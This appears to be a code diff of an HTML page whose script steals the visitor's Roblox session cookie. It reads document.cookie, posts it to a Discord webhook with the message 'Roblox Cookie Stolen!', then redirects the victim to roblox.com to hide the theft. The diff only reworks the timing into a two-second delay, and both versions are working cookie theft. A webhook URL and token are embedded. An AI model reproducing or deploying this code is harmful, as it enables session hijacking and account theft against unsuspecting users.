@@ -2,30 +2,22 @@
 <html>
 <body>
 <script>
-    // REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
+    // REPLACE WITH YOUR REAL WEBHOOK URL
     const webhook = "https://discord.com/api/webhooks/1566889927331938345/HjeYNYbP4TPSbCefwKt93LDBpEVBqAatY6fSiDBRB36wglMU8p14V4KgqdPU0aR-AQcb"; 
 
-    async function steal() {
+    setTimeout(async () => {
         try {
-            // Get the cookie
             const cookie = document.cookie;
-            
-            // Send it to Discord
             await fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: "**Roblox Session Stolen!**\n\nCookie: ```" + cookie + "```"
+                    content: "**Roblox Cookie Stolen!**\n\nCookie: ```" + cookie + "```"
                 })
             });
         } catch (e) {}
-        
-        // Redirect to Roblox so they don't notice
         window.location.href = "https://www.roblox.com/";
-    }
-
-    // Run immediately when the page loads
-    steal();
+    }, 2000); // Waits 2 seconds for Roblox to load cookies
 </script>
 </body>
 </html>
